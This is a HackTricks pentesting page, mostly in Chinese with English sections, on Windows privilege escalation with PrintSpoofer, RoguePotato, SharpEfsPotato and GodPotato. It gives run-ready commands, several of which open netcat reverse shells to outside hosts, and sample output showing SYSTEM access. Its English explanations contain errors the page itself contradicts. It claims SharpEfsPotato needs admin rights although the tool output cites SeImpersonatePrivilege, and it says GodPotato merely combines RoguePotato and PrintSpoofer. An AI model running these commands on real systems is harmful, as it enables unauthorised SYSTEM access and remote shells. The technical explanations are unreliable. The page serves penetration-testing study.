# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

{% hint style="warning" %}
**JuicyPotato在Windows Server 2019和Windows 10版本1809之后不起作用**。然而，可以使用[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**，**[**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**，**[**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**，**[**GodPotato**](https://github.com/BeichenDream/GodPotato)来**利用相同的权限并获得`NT AUTHORITY\SYSTEM`级别的访问权限**。这篇[博文](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)深入介绍了`PrintSpoofer`工具，该工具可用于滥用Windows 10和Server 2019主机上的模拟权限，JuicyPotato不再起作用。
{% endhint %}

## 快速演示

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
### RoguePotato

RoguePotato is a local privilege escalation technique that takes advantage of the Windows COM Server to execute arbitrary code with SYSTEM privileges. This technique exploits the "Local Service" to "Local System" privilege escalation vulnerability.

To perform this attack, you need to have a low-privileged user account on the target system. RoguePotato works by creating a malicious COM Server that impersonates the "Local Service" account. When a privileged process requests the COM Server, it will execute the malicious code with SYSTEM privileges.

The steps to execute RoguePotato are as follows:

1. Compile the RoguePotato code using Visual Studio or any other C++ compiler.
2. Transfer the compiled executable to the target system.
3. Open a command prompt with the low-privileged user account.
4. Execute the RoguePotato executable.
5. Wait for a privileged process to request the COM Server.
6. Once the COM Server is requested, the malicious code will be executed with SYSTEM privileges.

RoguePotato is a powerful technique that can bypass certain security measures, such as User Account Control (UAC), and escalate privileges on a Windows system. It is important to note that this technique should only be used for ethical hacking and penetration testing purposes, with proper authorization.
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
### SharpEfsPotato

SharpEfsPotato is a tool that leverages the EfsRpcOpenFileRaw function to perform a Local Privilege Escalation (LPE) attack on Windows systems. This attack takes advantage of the EFS (Encrypting File System) service, which allows users to encrypt files and folders on their system.

By exploiting a misconfiguration in the EFS service, an attacker can escalate their privileges from a low-privileged user to SYSTEM level. This can be achieved by creating a specially crafted file and using the EfsRpcOpenFileRaw function to open it. The function will then execute a command as SYSTEM, allowing the attacker to gain full control over the system.

To use SharpEfsPotato, you need to provide the path to the file you want to create and execute as SYSTEM. The tool will then create the file and use the EfsRpcOpenFileRaw function to open it, triggering the privilege escalation.

It's important to note that this attack requires administrative privileges to execute successfully. Additionally, it's worth mentioning that this technique has been patched in newer versions of Windows, so it may not work on fully updated systems.

To protect against this attack, it's recommended to keep your Windows systems up to date with the latest security patches and configurations.
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

GodPotato is a technique that combines the RoguePotato and PrintSpoofer exploits to achieve local privilege escalation on Windows systems. 

RoguePotato is an exploit that takes advantage of the Windows COM Server to execute arbitrary code with SYSTEM privileges. It works by creating a malicious COM object that triggers the execution of a specified command. This can be used to escalate privileges from a low-privileged user to SYSTEM.

PrintSpoofer, on the other hand, is a tool that abuses the Windows Print Spooler service to gain SYSTEM privileges. It exploits a vulnerability in the service that allows an attacker to impersonate the SYSTEM account and execute arbitrary commands.

By combining these two exploits, GodPotato allows an attacker to escalate their privileges on a Windows system. The attacker first uses RoguePotato to create a malicious COM object that triggers the execution of PrintSpoofer. This allows them to gain SYSTEM privileges and execute arbitrary commands on the target system.

To protect against GodPotato, it is recommended to apply the latest security patches and updates to your Windows systems. Additionally, disabling the Windows Print Spooler service can help mitigate the risk of PrintSpoofer exploitation.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
